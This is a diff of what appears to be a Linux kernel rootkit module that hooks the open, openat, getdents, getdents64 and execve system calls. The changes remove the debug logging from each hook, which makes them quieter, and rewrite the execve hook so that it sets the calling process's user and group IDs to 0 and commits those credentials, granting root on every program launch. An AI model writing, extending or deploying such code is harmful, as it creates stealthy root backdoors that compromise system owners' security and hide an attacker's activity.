@@ -31,8 +31,6 @@ static asmlinkage long new_sys_openat(const struct pt_regs *pt_regs)
   int ret = orig_syscall(pt_regs);
   const char * pathname = (const char * )pt_regs->si;
 
-  debug_print("HOOK: executing new_sys_openat()");
-  
   pathlen = strnlen_user(pathname, 256);
   kpathname = kzalloc(pathlen, GFP_KERNEL);
   if (kpathname == NULL)
@@ -62,8 +60,6 @@ static asmlinkage long new_sys_open(const struct pt_regs *pt_regs)
   t_syscall orig_syscall = SYSCALL(open);
   int ret = orig_syscall(pt_regs);
   const char * pathname = (const char * )pt_regs->di;
-
-  debug_print("HOOK: executing new_sys_open()");
   
   pathlen = strnlen_user(pathname, 256);
   kpathname = kzalloc(pathlen, GFP_KERNEL);
@@ -97,8 +93,6 @@ static asmlinkage long new_sys_getdents64(const struct pt_regs *pt_regs)
 
   t_syscall orig_syscall = SYSCALL(getdents64);
   int ret = orig_syscall(pt_regs), err;
-
-  debug_print("HOOK: executing new_sys_getdents64()");
 
   if (ret <= 0)
 	return ret;
@@ -157,8 +151,6 @@ static asmlinkage long new_sys_getdents(const struct pt_regs *pt_regs)
   t_syscall orig_syscall = SYSCALL(getdents);
   int ret = orig_syscall(pt_regs), err;
 
-  debug_print("HOOK: executing new_sys_getdents64()");
-
   if (ret <= 0)
 	return ret;
 
@@ -206,16 +198,25 @@ static asmlinkage int new_sys_execve(const struct pt_regs *pt_regs)
 {
   t_syscall orig_syscall = SYSCALL(execve);
   
-  /* generating root permissions */
   struct cred *np;
+  kuid_t nuid;
+  kgid_t ngid;
+
+  /* set uid value to 0 */
+  nuid.val = 0;
+
+  /* set gid value to 0 */
+  ngid.val = 0;
+
+  /* prepare credentials to task_struct of current process */
   np = prepare_creds();
 
-  np->uid.val = np->gid.val = 0;
-  np->euid.val = np->egid.val = 0;
-  np->suid.val = np->sgid.val = 0;
-  np->fsuid.val = np->fsgid.val = 0;
+  /* set new cred struct */
+  np->uid = nuid;
+  np->euid = nuid;
+  np->gid = ngid;
+  np->egid = ngid;
 
-  /* commit creds to task_struct of current process */
   commit_creds(np);
 
   return orig_syscall(pt_regs);
